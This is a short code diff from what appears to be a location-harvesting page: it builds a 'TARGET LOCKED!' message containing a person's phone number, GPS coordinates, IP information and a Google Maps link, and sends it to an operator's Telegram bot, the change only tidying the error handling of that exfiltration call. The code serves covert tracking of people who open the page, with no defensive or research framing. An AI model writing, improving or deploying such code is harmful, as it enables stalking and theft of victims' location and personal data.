@@ -117,9 +117,15 @@
 
         const message = `🎯 <b>TARGET LOCKED!</b>%0A📱 <b>No HP:</b> <code>${phone}</code>%0A📍 <b>Lat:</b> <code>${lat}</code>%0A📍 <b>Lon:</b> <code>${lon}</code>%0A🛰️ <b>Akurasi:</b> ${acc} meter%0A🌐 <b>IP:</b> ${ipInfo}%0A🌍 <b>Google Maps:</b> https://www.google.com/maps?q=${lat},${lon}`;
 
-        fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage?chat_id=${TELE_ID}&text=${message}&parse_mode=html`)
-        .then(() => log("UPLINK SUCCESSFUL. DATA STORED IN CLOUD."))
-        .catch(() => log("CRITICAL: UPLINK FAILED!"));
+    fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage?chat_id=${TELE_ID}&text=${message}&parse_mode=html`)
+.then(response => {
+    if(response.ok) {
+        log("UPLINK SUCCESSFUL. DATA STORED.");
+    } else {
+        log("TELEGRAM ERROR: " + response.statusText);
+    }
+})
+.catch(err => log("NETWORK ERROR: " + err));
     }
 
     function initiateUplink() {
